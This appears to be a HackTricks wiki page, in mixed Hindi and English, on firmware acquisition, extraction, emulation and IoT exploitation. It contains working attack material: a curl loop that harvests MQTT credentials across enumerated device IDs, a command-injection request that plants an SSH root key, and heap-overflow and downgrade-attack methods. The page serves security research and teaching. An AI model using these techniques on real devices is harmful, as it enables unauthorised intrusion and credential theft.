# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक software है जो devices को सही तरीके से operate करने में सक्षम बनाता है, hardware components और users द्वारा interact किए जाने वाले software के बीच communication को manage और facilitate करके। यह permanent memory में stored रहता है, जिससे device power on होते ही vital instructions access कर सकता है, और इसी से operating system launch होता है। Firmware का examining और potentially modifying करना security vulnerabilities identify करने का एक critical step है।

## **Gathering Information**

**Gathering information** किसी device की structure और उसमें इस्तेमाल होने वाली technologies को समझने का एक critical initial step है। इस process में निम्न data collect करना शामिल है:

- CPU architecture और operating system जो यह run करता है
- Bootloader specifics
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और identified vulnerabilities

इस purpose के लिए, **open-source intelligence (OSINT)** tools बेहद valuable हैं, साथ ही available open-source software components का manual और automated review processes के through analysis भी। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools free static analysis offer करते हैं, जिनका उपयोग potential issues find करने के लिए किया जा सकता है।

## **Acquiring the Firmware**

Firmware obtain करने के कई तरीके हैं, और हर तरीके की अपनी complexity level होती है:

- source से **Directly** (developers, manufacturers)
- provided instructions से इसे **Building** करके
- official support sites से **Downloading** करके
- hosted firmware files find करने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools के साथ **cloud storage** को directly access करके
- man-in-the-middle techniques के जरिए **updates** intercept करके
- **UART**, **JTAG**, या **PICit** जैसे connections के through device से **Extracting** करके
- device communication के भीतर update requests के लिए **Sniffing** करके
- **hardcoded update endpoints** को identify करके और उनका उपयोग करके
- bootloader या network से **Dumping** करके
- जब बाकी सब fail हो जाए, तो appropriate hardware tools का उपयोग करके storage chip को **Removing and reading** करके

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. SOIC-8 clip + programmer (3.3V) से SPI flash dump करें:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition locate करें, `bootargs` को edit करें ताकि उसमें `init=/bin/sh` शामिल हो, और blob के लिए **U-Boot env CRC32** दोबारा compute करें।
3. केवल env partition reflash करें और reboot करें; UART पर एक shell दिखाई देना चाहिए।

This embedded devices पर useful है जहाँ bootloader shell disabled है लेकिन env partition external flash access के जरिए writable है।

## Analyzing the firmware

अब जब आपके पास **firmware** है, आपको उसके बारे में information extract करनी होगी ताकि पता चल सके कि उसे कैसे handle करना है। इसके लिए आप अलग-अलग tools इस्तेमाल कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
अगर आपको उन tools के साथ ज़्यादा कुछ नहीं मिलता है, तो `binwalk -E <bin>` से image की **entropy** check करें; अगर entropy low है, तो उसके encrypted होने की संभावना कम है। अगर entropy high है, तो यह likely encrypted है (या किसी तरह compressed है)।

इसके अलावा, आप इन tools का उपयोग firmware के अंदर embedded **files** निकालने के लिए कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file inspect करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग करें।

### Getting the Filesystem

पिछले commented tools जैसे `binwalk -ev <bin>` के साथ आपको **filesystem extract** करने में सक्षम होना चाहिए।\
Binwalk आमतौर पर इसे **filesystem type** के नाम वाले एक **folder** में extract करता है, जो आम तौर पर इनमें से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Manual Filesystem Extraction

कभी-कभी, binwalk के signatures में filesystem का **magic byte** नहीं होगा। ऐसे मामलों में, binwalk का उपयोग करके filesystem का **offset** ढूँढें और compressed filesystem को binary से **carve** करें, और फिर नीचे दिए गए steps के अनुसार उसके type के हिसाब से filesystem को **manually extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem को carve करने के लिए निम्न **dd command** चलाएँ।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्नलिखित command भी चलाया जा सकता है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर के example में इस्तेमाल किया गया)

`$ unsquashfs dir.squashfs`

Files बाद में "`squashfs-root`" directory में होंगे।

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- ubifs filesystems with NAND flash के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware का Analysis

एक बार firmware प्राप्त हो जाने पर, इसकी structure और संभावित vulnerabilities को समझने के लिए इसे dissect करना ज़रूरी है। इस process में firmware image से valuable data analyze और extract करने के लिए विभिन्न tools का उपयोग शामिल है।

### Initial Analysis Tools

binary file (जिसे `<bin>` कहा गया है) की initial inspection के लिए commands का एक set दिया गया है। ये commands file types identify करने, strings extract करने, binary data analyze करने, और partition तथा filesystem details समझने में मदद करते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
छवि की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` के साथ **entropy** की जांच की जाती है। कम entropy encryption की कमी का संकेत देती है, जबकि high entropy संभावित encryption या compression को दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** documentation और फ़ाइल inspection के लिए **binvis.io** जैसे tools और resources की सिफारिश की जाती है।

### Filesystem निकालना

`binwalk -ev <bin>` का उपयोग करके, आमतौर पर filesystem निकाला जा सकता है, अक्सर filesystem type के नाम पर बने directory में (जैसे, squashfs, ubifs)। हालांकि, जब **binwalk** missing magic bytes के कारण filesystem type को पहचानने में विफल होता है, तब manual extraction आवश्यक होती है। इसमें filesystem का offset ढूँढने के लिए `binwalk` का उपयोग किया जाता है, उसके बाद `dd` command से filesystem को carve out किया जाता है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
इसके बाद, filesystem type (जैसे, squashfs, cpio, jffs2, ubifs) के आधार पर, contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem Analysis

filesystem extract हो जाने के बाद, security flaws की खोज शुरू होती है। insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

**Key locations** और **items** जिन्हें inspect करना चाहिए:

- user credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे analysis के लिए embedded binaries
- Common IoT device web servers और binaries

filesystem के भीतर sensitive information और vulnerabilities खोजने में कई tools मदद करते हैं:

- sensitive information search के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- comprehensive firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), और [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

filesystem में मिले source code और compiled binaries दोनों की vulnerabilities के लिए जांच की जानी चाहिए। **checksec.sh** जैसे tools Unix binaries के लिए और **PESecurity** Windows binaries के लिए unprotected binaries की पहचान करने में मदद करते हैं, जिनका exploit किया जा सकता है।

## Harvesting cloud config and MQTT credentials via derived URL tokens

कई IoT hubs अपनी per-device configuration को एक cloud endpoint से fetch करते हैं जो इस तरह दिखता है:

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis के दौरान आपको मिल सकता है कि `<token>` locally device ID से hardcoded secret का उपयोग करके derive किया गया है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और uppercase hex में represented

यह design किसी को भी, जो deviceId और STATIC_KEY जानता है, URL reconstruct करने और cloud config pull करने की सुविधा देता है, जिससे अक्सर plaintext MQTT credentials और topic prefixes reveal हो जाते हैं।

Practical workflow:

1) UART boot logs से deviceId extract करें

- logs capture करने के लिए 3.3V UART adapter (TX/RX/GND) connect करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern और broker address प्रिंट करने वाली lines खोजें, उदाहरण के लिए:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware से STATIC_KEY और token algorithm recover करें

- binaries को Ghidra/radare2 में load करें और config path ("/pf/") या MD5 usage search करें।
- algorithm confirm करें (e.g., MD5(deviceId||STATIC_KEY)).
- Bash में token derive करें और digest को uppercase करें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config और MQTT credentials harvest करें

- URL compose करें और curl से JSON pull करें; secrets extract करने के लिए jq से parse करें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और weak topic ACLs का abuse करें (यदि मौजूद हों)

- recovered credentials का उपयोग करके maintenance topics को subscribe करें और sensitive events खोजें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) अनुमानित device IDs enumerate करें (scale पर, authorization के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद sequential suffix embed होता है।
- आप candidate IDs iterate कर सकते हैं, tokens derive कर सकते हैं और configs programmatically fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- मास enumeration करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- संभव हो तो target hardware को modify किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।


Firmware को emulate करने की प्रक्रिया **dynamic analysis** को सक्षम बनाती है, चाहे वह device के operation का हो या किसी individual program का। यह approach hardware या architecture dependencies के साथ चुनौतियों का सामना कर सकती है, लेकिन root filesystem या specific binaries को matching architecture और endianness वाले device, जैसे Raspberry Pi, या pre-built virtual machine पर transfer करने से आगे testing आसान हो सकती है।

### Emulating Individual Binaries

single programs की examination के लिए, program की endianness और CPU architecture की पहचान करना crucial है।

#### Example with MIPS Architecture

MIPS architecture binary को emulate करने के लिए, one can use the command:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools स्थापित करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए, `qemu-mipsel` चुनाव होगा।

#### ARM Architecture Emulation

ARM binaries के लिए, प्रक्रिया समान है, और emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), और अन्य tools, full firmware emulation को आसान बनाते हैं, प्रक्रिया को automate करते हैं और dynamic analysis में मदद करते हैं।

## Dynamic Analysis in Practice

इस stage पर, analysis के लिए या तो real या emulated device environment का उपयोग किया जाता है। OS और filesystem पर shell access बनाए रखना essential है। Emulation hardware interactions को पूरी तरह से mimic नहीं कर सकती, इसलिए कभी-कभी emulation restarts की आवश्यकता होती है। Analysis में filesystem को फिर से देखना, exposed webpages और network services का exploit करना, और bootloader vulnerabilities का explore करना शामिल होना चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests critical हैं।

## Runtime Analysis Techniques

Runtime analysis में अपने operating environment में किसी process या binary के साथ interact करना शामिल है, जिसमें breakpoints set करने और fuzzing तथा अन्य techniques के जरिए vulnerabilities की पहचान करने के लिए gdb-multiarch, Frida, और Ghidra जैसे tools का उपयोग किया जाता है।

Full debugger के बिना embedded targets के लिए, **copy a statically-linked `gdbserver`** को device पर copy करें और remotely attach करें:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubs पर RF stack अक्सर **radio MCU** और Linux userland process के बीच split होता है। एक उपयोगी workflow है path map करना:

1. **RF frame** on the air
2. **controller-side parser** on the radio MCU
3. Linux को forwarded **serial/UART text or TLV protocol** (उदाहरण `/dev/tty*`)
4. main daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

यह architecture एक की बजाय दो reversing targets बनाती है। अगर controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो recover करें:

- **message groups** और dispatch tables
- कौन से messages **network** से आ सकते हैं बनाम controller खुद से
- exact **manufacturer-specific discriminator fields** (उदाहरण Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन से handlers सिर्फ **commissioning**, discovery, या firmware/model download phases में reachable हैं

Zigbee के लिए खास तौर पर pairing traffic capture करें और check करें कि target अभी भी default **Link Key** `ZigBeeAlliance09` पर rely करता है या नहीं। अगर हाँ, तो commissioning traffic sniffing से **Network Key** expose हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए note करें कि tested device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं क्योंकि वे **custom parsing code** और internal **FSMs** को feed करते हैं, जिनकी validation कम battle-tested होती है।

Practical workflow:

- command dispatcher को reverse करें जब तक **vendor-only handler** न मिल जाए।
- **FSM state**, **event**, **check**, **action**, और **next-state** tables recover करें।
- **transitional states** पहचानें जो auto-advance करती हैं और retry/error branches जो eventually attacker-controlled state को reset या free करती हैं।
- confirm करें कि कौन से legitimate protocol exchanges जरूरी हैं daemon को vulnerable state में रखने के लिए, बजाय यह assume करने के कि buggy handler हमेशा reachable है।

Timing-sensitive protocols के लिए, Python framework से packet replay बहुत slow हो सकता है। ज्यादा reliable तरीका है real hardware पर legitimate device emulate करना (उदाहरण **nRF52840**) with a vendor-grade stack, ताकि आप सही **endpoints**, **attributes**, और commissioning timing expose कर सकें।

### Fragmented-download bug class in embedded daemons

एक recurring firmware bug class **fragmented blob/model/configuration downloads** में दिखाई देती है:

1. **first fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments सिर्फ attacker-controlled **packet-local** fields validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`.
3. copy `memcpy(&ctx->buffer[offset], chunk, chunk_len)` इस्तेमाल करती है बिना **original allocated size** check किए।

यह attacker को यह send करने देता है:

- एक first valid fragment with a **small** declared total size, ताकि small heap allocation force हो।
- एक later fragment with the **expected offset** लेकिन बड़ा `chunk_len`.
- एक forged packet-local size जो fresh checks satisfy करे, जबकि originally allocated buffer overflow हो रहा हो।

जब vulnerable path commissioning logic के पीछे हो, exploitation में पर्याप्त **device emulation** शामिल होनी चाहिए ताकि target expected model-download या blob-download state में जाए, फिर malformed fragments भेजें।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार" नहीं बल्कि **protocol के own error handling** को force करना होता है:

- malformed follow-up fragments भेजें ताकि FSM **retry** या **error** states में जाए।
- retry threshold exceed करें ताकि daemon **context reset** करे और corrupted buffer free करे।
- इस predictable `free()` का use allocator-side primitives trigger करने के लिए करें, इससे पहले कि process unrelated reasons से crash हो।

यह खास तौर पर **musl/uClibc/dlmalloc-like** allocators in embedded Linux के खिलाफ उपयोगी है, जहाँ chunk metadata corrupt करना unlink/unbin logic को write primitive में बदल सकता है। एक stable pattern है **size field** corrupt करना ताकि allocator traversal को **fake chunks staged inside the overflowed buffer** की ओर redirect किया जा सके, बजाय तुरंत real bin pointers clobber करके process crash करने के।

## Binary Exploitation and Proof-of-Concept

Identified vulnerabilities के लिए PoC develop करने में target architecture की deep understanding और lower-level languages में programming की जरूरत होती है। Embedded systems में binary runtime protections rare हैं, लेकिन जब present हों, तो Return Oriented Programming (ROP) जैसी techniques जरूरी हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc glibc जैसी fastbins use करता है। बाद में बड़ी allocation `__malloc_consolidate()` trigger कर सकती है, इसलिए fake chunk को checks survive करने चाहिए (sane size, `fd = 0`, और surrounding chunks "in use" दिखने चाहिए)।
- **Non-PIE binaries under ASLR:** अगर ASLR enabled है लेकिन main binary **non-PIE** है, तो in-binary `.data/.bss` addresses stable रहते हैं। आप ऐसे region को target कर सकते हैं जो already valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation को **function pointer table** पर land कराया जा सके।
- **Parser-stopping NUL:** जब JSON parse होता है, payload में `\x00` parsing रोक सकता है जबकि trailing attacker-controlled bytes stack pivot/ROP chain के लिए बची रहती हैं।
- **Shellcode via `/proc/self/mem`:** एक ROP chain जो `open("/proc/self/mem")`, `lseek()`, और `write()` call करती है, ज्ञात mapping में executable shellcode डाल सकती है और फिर उसी पर jump कर सकती है।

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments प्रदान करते हैं, जिनमें आवश्यक tools मौजूद होते हैं।

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है जो Internet of Things (IoT) devices पर security assessment और penetration testing करने में मदद करने के लिए बनाया गया है। यह सभी आवश्यक tools के साथ pre-configured environment देकर आपका बहुत समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 based embedded security testing operating system, जिसमें firmware security testing tools preloaded हैं।

## Firmware Downgrade Attacks & Insecure Update Mechanisms

भले ही कोई vendor firmware images के लिए cryptographic signature checks implement करे, **version rollback (downgrade) protection अक्सर omitted होती है**। जब boot- या recovery-loader सिर्फ embedded public key से signature verify करता है लेकिन flashed image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से एक **older, vulnerable firmware** install कर सकता है जो अभी भी valid signature रखता है, और इस तरह patched vulnerabilities फिर से introduce हो जाती हैं।

Typical attack workflow:

1. **Obtain an older signed image**
* उसे vendor के public download portal, CDN या support site से लें।
* companion mobile/desktop applications से extract करें (जैसे Android APK के अंदर `assets/firmware/` में)।
* तीसरे-पक्ष repositories जैसे VirusTotal, Internet archives, forums, आदि से retrieve करें।
2. **Upload or serve the image to the device** किसी भी exposed update channel के जरिए:
* Web UI, mobile-app API, USB, TFTP, MQTT, आदि।
* कई consumer IoT devices *unauthenticated* HTTP(S) endpoints expose करते हैं जो Base64-encoded firmware blobs accept करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade trigger करते हैं।
3. Downgrade के बाद, उस vulnerability को exploit करें जो नए release में patched की गई थी (उदाहरण बाद में जोड़ा गया command-injection filter)।
4. वैकल्पिक रूप से latest image वापस flash करें या updates disable करें ताकि persistence मिलने के बाद detection से बचा जा सके।

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Vulnerable (downgraded) firmware में, `md5` parameter को सीधे shell command में concatenate किया जाता है बिना sanitisation के, जिससे arbitrary commands inject करना संभव हो जाता है (यहाँ – SSH key-based root access सक्षम करना)। बाद के firmware versions ने एक basic character filter introduced किया, लेकिन downgrade protection की absence इस fix को moot बना देती है।

### Extracting Firmware From Mobile Apps

Many vendors अपने companion mobile applications के अंदर full firmware images bundle करते हैं ताकि app Bluetooth/Wi-Fi के over device को update कर सके। ये packages आमतौर पर APK/APEX में unencrypted stored होते हैं, paths जैसे `assets/fw/` या `res/raw/` के under। `apktool`, `ghidra`, या plain `unzip` जैसे tools आपको physical hardware को touch किए बिना signed images pull करने देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से protected है (TLS + authentication)?
* क्या device flash करने से पहले **version numbers** या **monotonic anti-rollback counter** compare करता है?
* क्या image secure boot chain के अंदर verify की जाती है (जैसे signatures ROM code द्वारा checked हों)?
* क्या userland code additional sanity checks perform करता है (जैसे allowed partition map, model number)?
* क्या *partial* या *backup* update flows same validation logic reuse करते हैं?

> 💡  अगर ऊपर में से कोई भी missing है, तो platform संभवतः rollback attacks के लिए vulnerable है।

## Practice के लिए Vulnerable firmware

Firmware में vulnerabilities discover करने का practice करने के लिए, निम्न vulnerable firmware projects को starting point के रूप में use करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
